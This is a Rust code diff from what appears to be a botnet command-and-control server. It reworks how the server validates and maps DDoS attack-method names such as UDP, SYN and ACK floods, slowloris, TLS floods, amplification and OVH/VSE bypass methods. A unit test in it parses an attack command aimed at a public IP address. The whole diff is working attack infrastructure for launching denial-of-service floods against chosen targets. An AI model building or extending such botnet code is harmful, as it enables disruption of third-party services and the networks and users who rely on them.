@@ -1,5 +1,6 @@
 use std::net::IpAddr;
 use super::error::{CncError, Result};
+use super::attack_manager::VALID_ATTACK_METHODS;
 
 pub fn check_ip_safety(ip: IpAddr) -> Result<()> {
     match ip {
@@ -85,23 +86,34 @@ pub fn validate_duration(duration_str: &str) -> Result<u64> {
 }
 
 pub fn validate_attack_method(method: &str) -> Result<String> {
-    const ALLOWED_METHODS: &[&str] = &[
-        "!udpflood", "!udpsmart", "!tcpflood", "!dns", "!http",
-        "!slowloris", "!sslflood", "!websocket", "!amplification", "!connection"
-    ];
+    // Normalize input
+    let normalized = method.trim().to_uppercase();
     
-    // Methods that require raw sockets - use fallback
-    const COMPATIBILITY_ALIASES: &[&str] = &[
-        "!synflood", "!ackflood", "!greflood", "!icmpflood"
-    ];
-    
-    if ALLOWED_METHODS.contains(&method) || COMPATIBILITY_ALIASES.contains(&method) {
-        Ok(method.to_string())
-    } else {
-        Err(CncError::InvalidCommand(
-            format!("Unknown attack method: {}. Type '?' to see available methods", method)
-        ))
+    // Check against valid methods from attack_manager
+    if VALID_ATTACK_METHODS.contains(&normalized.as_str()) {
+        return Ok(normalized);
     }
+    
+    // Legacy compatibility mapping
+    let mapped = match method.to_lowercase().as_str() {
+        "!udpflood" | "!udpsmart" => "UDP",
+        "!tcpflood" => "TCP",
+        "!http" => "HTTP",
+        "!synflood" => "SYN",
+        "!ackflood" => "ACK",
+        "!slowloris" => "HTTP", // Map to HTTP or specific if available
+        "!sslflood" | "!tls" => "TLS",
+        "!vse" => "VSE",
+        "!ovh" => "OVH",
+        "!std" => "STD",
+        _ => {
+            return Err(CncError::InvalidCommand(
+                format!("Unknown attack method: {}. Type 'methods' to see available methods", method)
+            ));
+        }
+    };
+    
+    Ok(mapped.to_string())
 }
 
 pub fn validate_attack_command(parts: &[&str]) -> Result<(String, IpAddr, u16, u64)> {
@@ -181,7 +193,7 @@ mod tests {
         assert!(result.is_ok());
         
         let (method, ip, port, duration) = result.unwrap();
-        assert_eq!(method, "!udpflood");
+        assert_eq!(method, "UDP"); // Should be normalized
         assert_eq!(ip.to_string(), "8.8.8.8");
         assert_eq!(port, 80);
         assert_eq!(duration, 30);
